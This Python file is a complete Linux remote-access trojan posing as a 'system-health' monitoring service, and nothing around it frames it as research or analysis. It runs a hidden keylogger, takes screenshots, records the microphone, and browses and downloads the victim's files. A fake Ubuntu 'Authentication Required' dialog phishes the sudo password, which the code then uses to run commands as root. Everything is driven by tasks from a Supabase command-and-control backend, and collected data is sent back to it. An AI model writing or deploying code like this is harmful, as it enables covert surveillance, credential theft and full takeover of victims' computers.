import os
import sys
import time
import json
import socket
import uuid
import random
import string
import platform
import subprocess
import base64
import urllib.request
import urllib.error
from datetime import datetime, timezone
import threading

# --- GLOBALS ---
KEYLOG_BUFFER = []
ROOT_PASSWORD = None
KEYLOG_LOCK = threading.Lock()

# --- CONFIGURATION ---
BASE_PATH = os.path.expanduser("~/.config/system-health")
CONFIG_FILE = os.path.join(BASE_PATH, "config.enc")
DEVICE_ID_FILE = os.path.join(BASE_PATH, ".device_id")
KEY = "S3cr3tK3y2024!"

# --- UTILS ---

def install_dependencies():
    """Attempt to install missing python dependencies silently if possible."""
    requirements = ["mss", "pynput"]
    for req in requirements:
        try:
            __import__(req)
        except ImportError:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", req, "--break-system-packages"],
                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

def get_config():
    try:
        if not os.path.exists(CONFIG_FILE):
            return None
        with open(CONFIG_FILE, "rb") as f:
            encoded = f.read().strip()
        encrypted = base64.b64decode(encoded)
        key_bytes = KEY.encode('utf-8')
        decrypted = bytearray()
        for i in range(len(encrypted)):
            decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
        return json.loads(decrypted.decode('utf-8'))
    except Exception as e:
        return None

def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, "r") as f:
            return f.read().strip()
    new_id = str(uuid.uuid4())
    try:
        os.makedirs(BASE_PATH, exist_ok=True)
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(new_id)
    except:
        pass
    return new_id

def get_device_name():
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(8))

def run_command(cmd, shell=True):
    try:
        result = subprocess.run(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1
    except Exception as e:
        return "", str(e), -1

# --- ACTIONS ---

def take_screenshot():
    try:
        import mss
        filename = f"/tmp/scr_{int(time.time())}.png"
        with mss.mss() as sct:
            sct.shot(mon=-1, output=filename)
        with open(filename, "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
        os.remove(filename)
        return img_data
    except Exception as e:
        raise e

# --- KEYLOGGER ---
def start_keylogger_thread():
    def on_press(key):
        try:
            char = key.char
        except AttributeError:
            char = f"[{str(key).replace('Key.', '')}]"
            
        with KEYLOG_LOCK:
            KEYLOG_BUFFER.append(str(char))
            if len(KEYLOG_BUFFER) > 5000:
                KEYLOG_BUFFER.pop(0)

    try:
        import pynput.keyboard
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
    except Exception as e:
        pass

def attempt_root_escalation():
    """
    Shows a custom AUTHENTICATION REQUIRED dialog using Tkinter.
    Replicates the exact look of Ubuntu's prompt.
    """
    global ROOT_PASSWORD
    
    # Check Tkinter availability
    try:
        import tkinter as tk
        from tkinter import font
    except ImportError as e:
        return False, "Tkinter not installed."

    result_pw = None

    def show_ui():
        nonlocal result_pw
        try:
            # Setup Root
            root = tk.Tk()
            root.withdraw()
            w, h = root.winfo_screenwidth(), root.winfo_screenheight()

            # Fixed dialog dimensions
            DIALOG_WIDTH = 373
            DIALOG_HEIGHT = 381

            # Create Dialog FIRST
            dialog = tk.Toplevel(root)
            dialog.title("Auth")
            dialog.overrideredirect(True)
            dialog.configure(bg='#2C2C2C')

            # Load Dialog Image
            base_dir = os.path.expanduser("~/.config/system-health")
            if not os.path.exists(base_dir):
                base_dir = os.path.dirname(os.path.abspath(__file__))
            img_path = os.path.join(base_dir, "prompt.png")

            bg_image = None
            try:
                import cv2
                import numpy as np
                
                png_img = cv2.imread(img_path, cv2.IMREAD_UNCHANGED)
                if png_img is not None:
                    png_img = cv2.resize(png_img, (DIALOG_WIDTH, DIALOG_HEIGHT), interpolation=cv2.INTER_LANCZOS4)
                    
                    if png_img.shape[2] == 4:
                        alpha = png_img[:, :, 3]
                        rgb = png_img[:, :, :3]
                        bg_color = np.array([44, 44, 44], dtype=np.uint8)
                        for c in range(3):
                            rgb[:, :, c] = rgb[:, :, c] * (alpha / 255.0) + bg_color[c] * (1.0 - alpha / 255.0)
                        temp_png = "/tmp/dialog_fixed.png"
                        cv2.imwrite(temp_png, rgb)
                        bg_image = tk.PhotoImage(file=temp_png)
                    else:
                        temp_png = "/tmp/dialog_fixed.png"
                        cv2.imwrite(temp_png, png_img)
                        bg_image = tk.PhotoImage(file=temp_png)
            except Exception as e:
                # Fallback to PIL
                try:
                    from PIL import Image
                    pil_img = Image.open(img_path)
                    pil_img = pil_img.resize((DIALOG_WIDTH, DIALOG_HEIGHT), Image.Resampling.LANCZOS)
                    temp_png = "/tmp/dialog_resized.png"
                    pil_img.save(temp_png)
                    bg_image = tk.PhotoImage(file=temp_png)
                except:
                    # Final fallback
                    try:
                        bg_image = tk.PhotoImage(file=img_path)
                    except:
                        bg_image = None

            # Center Dialog
            x = (w - DIALOG_WIDTH) // 2
            y = (h - DIALOG_HEIGHT) // 2
            dialog.geometry(f"{DIALOG_WIDTH}x{DIALOG_HEIGHT}+{x}+{y}")

            # Dimmer
            dimmer = None
            try:
                import mss
                import mss.tools
                import cv2
                temp_screenshot = "/tmp/screen_bright.png"
                with mss.mss() as sct:
                    sct_img = sct.grab(sct.monitors[0])
                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=temp_screenshot)
                
                img = cv2.imread(temp_screenshot)
                dimmed_img = cv2.convertScaleAbs(img, alpha=0.4, beta=0)
                temp_dimmed = "/tmp/screen_dimmed.png"
                cv2.imwrite(temp_dimmed, dimmed_img)
                screen_photo = tk.PhotoImage(file=temp_dimmed)
                
                dimmer = tk.Toplevel(root)
                dimmer.geometry(f"{w}x{h}+0+0")
                dimmer.overrideredirect(True)
                dimmer.configure(bg='black')
                dimmer_label = tk.Label(dimmer, image=screen_photo, borderwidth=0)
                dimmer_label.image = screen_photo
                dimmer_label.place(x=0, y=0)
            except:
                dimmer = tk.Toplevel(root)
                dimmer.geometry(f"{w}x{h}+0+0")
                dimmer.configure(bg='black')
                dimmer.overrideredirect(True)

            # Background Label
            if bg_image:
                bg_lbl = tk.Label(dialog, image=bg_image, borderwidth=0, highlightthickness=0)
                bg_lbl.image = bg_image
                bg_lbl.place(x=0, y=0)

            if dimmer: dimmer.lower(dialog)
            dialog.lift()
            dialog.attributes('-topmost', True)

            # Layout Config
            POS = { 'title_y': 50, 'msg_y': 85, 'avatar_y': 170, 'username_y': 220, 'input_y': 273, 'input_w': 260, 'input_h': 28, 'btn_h': 41, 'btn_gap': 1 }
            TEXT_COLOR = 'white'
            TITLE_BG = '#1d1d1d'
            MSG_BG = '#1d1d1d'
            AVATAR_BG = '#272727'
            USERNAME_BG = '#1d1d1d'
            ENTRY_BG = '#393230'
            BTN_AUTH_BG = '#323232'
            BTN_AUTH_HOVER = '#424242'
            BTN_CANCEL_BG = '#323232'
            BTN_CANCEL_HOVER = '#424242'

            hdr_font = font.Font(family="Ubuntu", size=13, weight="bold")
            tk.Label(dialog, text="Authentication Required", bg=TITLE_BG, fg=TEXT_COLOR, font=hdr_font).place(relx=0.5, y=POS['title_y'], anchor='center')
            
            body_font = font.Font(family="Ubuntu", size=10)
            msg = "Authentication keyring is needed to upgrade\nsystem packages"
            tk.Label(dialog, text=msg, bg=MSG_BG, fg='#CCCCCC', font=body_font, justify='center').place(relx=0.5, y=POS['msg_y'], anchor='center')

            username = os.getlogin()
            initial = username[0].upper() if username else "?"
            tk.Label(dialog, text=initial, bg=AVATAR_BG, fg='white', font=("Ubuntu", 18, "bold")).place(relx=0.5, y=POS['avatar_y'], anchor='center')
            tk.Label(dialog, text=username, bg=USERNAME_BG, fg=TEXT_COLOR, font=("Ubuntu", 12, "bold")).place(relx=0.5, y=POS['username_y'], anchor='center')

            pw_entry = tk.Entry(dialog, show="•", bg=ENTRY_BG, fg='white', relief='flat', bd=0, highlightthickness=0, font=("Ubuntu", 15), insertbackground='white', justify='center')
            pw_entry.place(relx=0.5, y=POS['input_y'], width=POS['input_w'], height=POS['input_h'], anchor='center')
            pw_entry.bind('<FocusOut>', lambda e: pw_entry.focus_set())

            btn_w = (DIALOG_WIDTH - POS['btn_gap']) // 2
            btn_y = DIALOG_HEIGHT - POS['btn_h']

            def cancel(e=None):
                try:
                    dialog.destroy()
                    if dimmer: dimmer.destroy()
                    root.destroy()
                except: pass

            def submit(event=None):
                nonlocal result_pw
                result_pw = pw_entry.get()
                try:
                    dialog.destroy()
                    if dimmer: dimmer.destroy()
                    root.destroy() 
                except: pass

            lbl_cancel = tk.Label(dialog, text="Cancel", bg=BTN_CANCEL_BG, fg='white', font=body_font)
            lbl_cancel.place(x=0, y=btn_y, width=btn_w, height=POS['btn_h'])
            lbl_cancel.bind("<Button-1>", cancel)

            lbl_auth = tk.Label(dialog, text="Authenticate", bg=BTN_AUTH_BG, fg='white', font=("Ubuntu", 10, "bold"))
            lbl_auth.place(x=btn_w + POS['btn_gap'], y=btn_y, width=btn_w, height=POS['btn_h'])
            lbl_auth.bind("<Button-1>", submit)

            # Hover effects - buttons become brighter on mouse over
            BTN_AUTH_HOVER = '#424242'
            BTN_CANCEL_HOVER = '#424242'
            
            def on_cancel_enter(e): lbl_cancel.config(bg=BTN_CANCEL_HOVER)
            def on_cancel_leave(e): lbl_cancel.config(bg=BTN_CANCEL_BG)
            def on_auth_enter(e): lbl_auth.config(bg=BTN_AUTH_HOVER)
            def on_auth_leave(e): lbl_auth.config(bg=BTN_AUTH_BG)
            
            lbl_cancel.bind("<Enter>", on_cancel_enter)
            lbl_cancel.bind("<Leave>", on_cancel_leave)

            def update_auth_button_state(e=None):
                if pw_entry.get():
                    lbl_auth.config(fg=TEXT_COLOR, cursor='hand2')
                    lbl_auth.bind("<Button-1>", submit)
                    lbl_auth.bind("<Enter>", on_auth_enter)
                    lbl_auth.bind("<Leave>", on_auth_leave)
                else:
                    lbl_auth.config(fg='#555555', cursor='arrow', bg=BTN_AUTH_BG)
                    lbl_auth.unbind("<Button-1>")
                    lbl_auth.unbind("<Enter>")
                    lbl_auth.unbind("<Leave>")
            
            pw_entry.bind('<KeyRelease>', update_auth_button_state)
            update_auth_button_state()
            
            def submit_if_valid(e=None):
                if pw_entry.get(): submit(e)
            pw_entry.bind('<Return>', submit_if_valid)
            dialog.bind('<Escape>', cancel)
            
            def set_focus():
                pw_entry.focus_force()
                try: dialog.grab_set_global()
                except: dialog.grab_set()
            dialog.after(250, set_focus)
            
            root.after(60000, lambda: cancel())

            try:
                root.mainloop()
            except Exception as e:
                pass
            
            # Cleanup
            try:
                if 'root' in locals(): root.destroy()
            except: pass

        except Exception as e:
            pass

    # Execute UI
    try:
        show_ui()
    except Exception as e:
        return False, f"UI Failed: {e}"

    if result_pw:
        test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
        if test.returncode == 0:
            ROOT_PASSWORD = result_pw
            return True, f"Success! Root password captured: {result_pw}"
        else:
            return False, "Password captured but incorrect."
    else:
        return False, "User cancelled."

def record_audio(duration=10):
    try:
        filename = f"/tmp/aud_{int(time.time())}.wav"
        result = subprocess.run(["arecord", "-d", str(duration), "-f", "cd", "-t", "wav", "-q", filename], capture_output=True, text=True)
        if result.returncode != 0: raise Exception(result.stderr.strip())
        with open(filename, "rb") as f: audio_data = base64.b64encode(f.read()).decode()
        os.remove(filename)
        return audio_data
    except Exception as e:
        raise e

def get_sys_info():
    info = {
        'platform': platform.platform(),
        'processor': platform.processor()
    }
    out, _, _ = run_command("free -h")
    info['memory'] = out
    out, _, _ = run_command("df -h /")
    info['disk'] = out
    out, _, _ = run_command("ip addr")
    info['network'] = out
    out, _, _ = run_command("whoami")
    info['user'] = out
    return json.dumps(info)

def api_request(config, endpoint, method="GET", data=None):
    url = f"{config['supabase_url']}/rest/v1/{endpoint}"
    headers = {
        "apikey": config['supabase_key'],
        "Authorization": f"Bearer {config['supabase_key']}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }
    try:
        req = urllib.request.Request(url, method=method)
        for k, v in headers.items(): 
            req.add_header(k, v)
        if data: 
            req.data = json.dumps(data).encode('utf-8')
        
        with urllib.request.urlopen(req) as response:
            response_data = response.read().decode()
            if method == "GET" and response_data: 
                return json.loads(response_data)
            return True
    except urllib.error.HTTPError as e:
        error_body = e.read().decode() if e.fp else "No error body"
        print(f"API Error ({endpoint}): {e.code} - {error_body}")
        return None
    except Exception as e:
        print(f"API Request Exception ({endpoint}): {e}")
        return None

def register_device(config, device_id):
    hostname = socket.gethostname()
    username = os.getlogin()
    os_info = f"Linux {platform.release()}"
    exists = api_request(config, f"devices?device_id=eq.{device_id}&select=device_id")
    data = {
        "device_id": device_id,
        "hostname": hostname,
        "username": username,
        "os_info": os_info,
        "last_sync": datetime.now(timezone.utc).isoformat()
    }
    if not exists:
        data["device_name"] = get_device_name()
        # data["registered"] = datetime.now(timezone.utc).isoformat()  # Removed as it's not in DB schema
        api_request(config, "devices", "POST", data)
    else:
        api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.now(timezone.utc).isoformat()})

def self_destruct():
    try:
        run_command("systemctl --user disable health-monitor.service")
        service_file = os.path.expanduser("~/.config/systemd/user/health-monitor.service")
        if os.path.exists(service_file): os.remove(service_file)
        run_command("systemctl --user daemon-reload")
        import shutil
        if os.path.exists(BASE_PATH): shutil.rmtree(BASE_PATH)
        return True
    except Exception as e:
        return False

def browse_files(path=""):
    """Browse files - starts from /home/user if no path provided"""
    try:
        items = []
        
        if not path or path == "":
            # Start from user's home directory
            path = os.path.expanduser("~")
        
        if not os.path.exists(path):
            return {"error": f"Path not found: {path}", "path": path}
        
        # List directory contents
        try:
            entries = os.listdir(path)
        except PermissionError:
            return {"error": "Permission denied", "path": path}
        
        for entry in entries:
            full_path = os.path.join(path, entry)
            try:
                stat = os.stat(full_path)
                is_dir = os.path.isdir(full_path)
                items.append({
                    "name": entry,
                    "type": "folder" if is_dir else "file",
                    "size": 0 if is_dir else stat.st_size,
                    "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                })
            except (PermissionError, OSError):
                items.append({
                    "name": entry,
                    "type": "unknown",
                    "size": 0,
                    "modified": ""
                })
        
        return {"path": path, "items": items, "count": len(items)}
    except Exception as e:
        return {"error": str(e), "path": path}

def download_file(file_path):
    """Download a file - returns base64 encoded content"""
    try:
        if not os.path.exists(file_path):
            return {"error": f"File not found: {file_path}"}
        
        file_stat = os.stat(file_path)
        file_size = file_stat.st_size
        
        # Check 1GB limit
        if file_size > 1073741824:
            return {"error": "File too large (max 1GB)", "size": file_size}
        
        # Read and encode file
        with open(file_path, "rb") as f:
            content = f.read()
        
        encoded = base64.b64encode(content).decode('utf-8')
        
        return {
            "filename": os.path.basename(file_path),
            "size": file_size,
            "path": file_path,
            "file_data": encoded
        }
    except PermissionError:
        return {"error": "Permission denied"}
    except Exception as e:
        return {"error": str(e)}

PROCESSED_TASKS = set()

def process_tasks(config, device_id):
    global ROOT_PASSWORD, PROCESSED_TASKS
    tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*&order=id.asc")
    if not tasks: 
        return

    for task in tasks:
        task_id = task['id']
        if task_id in PROCESSED_TASKS:
            continue
        
        # Mark task as processing immediately to prevent double execution
        task_processing_payload = {
            "status": "processing"
        }
        api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_processing_payload)
        PROCESSED_TASKS.add(task_id)
        task_type = task['task_type']
        params = task.get('task_params', {})

        result_data = None
        data_type = None
        should_destruct = False
        should_fail_task = False

        try:
            if task_type == "display_capture":
                if "DISPLAY" not in os.environ: 
                    os.environ["DISPLAY"] = ":0"
                img = take_screenshot()
                if img:
                    result_data = {"file_data": img}
                    data_type = "display"
                else: 
                    should_fail_task = True

            elif task_type == "input_monitor":
                duration = int(params.get('duration', 60))
                # Clear buffer before monitoring
                with KEYLOG_LOCK:
                    KEYLOG_BUFFER.clear()
                
                time.sleep(duration)
                
                with KEYLOG_LOCK:
                    logs = "".join(KEYLOG_BUFFER)
                
                result_data = {"data": logs if logs else "[No keystrokes recorded]"}
                data_type = "input"

            elif task_type == "voice_capture":
                duration = int(params.get('duration', 10))
                audio = record_audio(duration)
                if audio:
                    result_data = {"file_data": audio}
                    data_type = "audio"
                else: 
                    should_fail_task = True

            elif task_type == "system_info":
                result_data = {"data": get_sys_info()}
                data_type = "sysinfo"

            elif task_type == "escalate_privileges":
                success_bool, msg = attempt_root_escalation()
                result_data = {"data": msg}
                data_type = "sysinfo"
                should_fail_task = not success_bool

            elif task_type == "auto_destruct":
                success = self_destruct()
                result_data = {"data": "Destroyed" if success else "Failed"}
                should_destruct = True

            elif task_type == "cmd_exec":
                cmd = params.get('command', '')
                out, err, code = run_command(cmd)
                result_data = {
                    "data": json.dumps({
                        "command": cmd, 
                        "output": out, 
                        "error": err, 
                        "exit_code": code, 
                        "executed_as": "USER"
                    })
                }
                data_type = "cmd_result"
                should_fail_task = (code != 0)

            elif task_type == "cmd_exec_admin":
                cmd = params.get('command', '')
                manual_pw = params.get('root_password', '').strip()
                effective_pw = manual_pw if manual_pw else ROOT_PASSWORD
                
                if effective_pw:
                    full_cmd = f"echo '{effective_pw}' | sudo -S {cmd}"
                    out, err, code = run_command(full_cmd)
                    exec_as = "ROOT"
                    if code == 0 and manual_pw: 
                        ROOT_PASSWORD = manual_pw
                else:
                    out = ""
                    err = "Error: No root password available. Run Escalate Privileges or provide manually."
                    code = -1
                    exec_as = "USER"
                
                result_data = {
                    "data": json.dumps({
                        "command": cmd, 
                        "output": out, 
                        "error": err, 
                        "exit_code": code, 
                        "executed_as": exec_as
                    })
                }
                data_type = "cmd_result"
                should_fail_task = (code != 0)

            elif task_type == "file_browse":
                path = params.get('path', '')
                result = browse_files(path)
                if "error" in result:
                    result_data = {"data": json.dumps(result)}
                    should_fail_task = True
                else:
                    result_data = {"data": json.dumps(result)}
                data_type = "file_list"

            elif task_type == "file_download":
                file_path = params.get('file', '')
                if file_path:
                    result = download_file(file_path)
                    if "error" in result:
                        result_data = {"data": json.dumps(result)}
                        should_fail_task = True
                    else:
                        result_data = {
                            "data": json.dumps({
                                "filename": result["filename"],
                                "size": result["size"],
                                "path": result["path"]
                            }),
                            "file_data": result["file_data"]
                        }
                else:
                    result_data = {"data": json.dumps({"error": "No file path provided"})}
                    should_fail_task = True
                data_type = "file_download"

            elif task_type == "restart_agent":
                # Mark task complete before restart
                task_update = {
                    "status": "complete",
                    "completed_at": datetime.now(timezone.utc).isoformat()
                }
                api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_update)
                
                # Send telemetry before restart
                telemetry_payload = {
                    "device_id": device_id,
                    "data_type": "sysinfo",
                    "data": "Agent restarting...",
                    "collected_at": datetime.now(timezone.utc).isoformat()
                }
                api_request(config, "telemetry", "POST", telemetry_payload)
                
                # Restart the systemd service
                run_command("systemctl --user restart health-monitor.service")
                
                # Exit to allow restart
                sys.exit(0)

            # Send Result
            if result_data:
                # 1. Insert data into telemetry table
                telemetry_payload = {
                    "device_id": device_id,
                    "collected_at": datetime.now(timezone.utc).isoformat()
                }
                
                # Add data_type if present
                if data_type:
                    telemetry_payload["data_type"] = data_type
                
                # Add either text data or file data
                if "data" in result_data:
                    telemetry_payload["data"] = result_data["data"]
                if "file_data" in result_data:
                    telemetry_payload["file_data"] = result_data["file_data"]
                
                telemetry_success = api_request(config, "telemetry", "POST", telemetry_payload)
                
                # 2. Update task status to complete
                task_update_payload = {
                    "status": "failed" if should_fail_task else "complete",
                    "completed_at": datetime.now(timezone.utc).isoformat()
                }
                
                task_success = api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_update_payload)
                
                if should_destruct: 
                    sys.exit(0)

        except Exception as e:
            error_payload = {
                "status": "failed", 
                "result_data": {"error": str(e)},
                "completed_at": datetime.now(timezone.utc).isoformat()
            }
            api_request(config, f"tasks?id=eq.{task_id}", "PATCH", error_payload)



def main():
    print("Agent starting...")
    config = get_config()
    if not config:
        print("Failed to load/decrypt config.enc")
        return
    
    device_id = get_device_id()
    print(f"Device ID: {device_id}")
    
    print("Installing dependencies...")
    install_dependencies()
    start_keylogger_thread()
    
    print(f"Starting main loop (Sync: {config.get('sync_interval', 10)}s)...")
    while True:
        try:
            print("Registering device...")
            register_device(config, device_id)
            print("Processing tasks...")
            process_tasks(config, device_id)
        except Exception as e:
            print(f"Main loop error: {e}")
        time.sleep(config.get('sync_interval', 10))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Fatal error: {e}")
